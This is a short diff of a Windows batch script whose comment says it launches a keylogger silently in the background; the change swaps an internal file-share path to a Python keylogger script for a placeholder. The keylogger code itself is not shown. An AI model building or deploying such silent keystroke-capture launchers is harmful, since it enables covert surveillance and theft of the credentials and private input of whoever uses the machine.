@@ -27,4 +27,4 @@ if errorlevel 1 (
 
 
 :: 3. Launch keylogger silently in the background
-start /b "" "%PYTHON_PATH%" "\\FS2.faicorp.local\Files\Shared\IT\Scripts\Python\PythonKeylogger\keywatcher_phaseone.py"
+start /b "" "%PYTHON_PATH%" "[ENTER PATH FOR WHERE KEYWATCHER_PHASEONE.PY IS LOCATED IN FILES]"
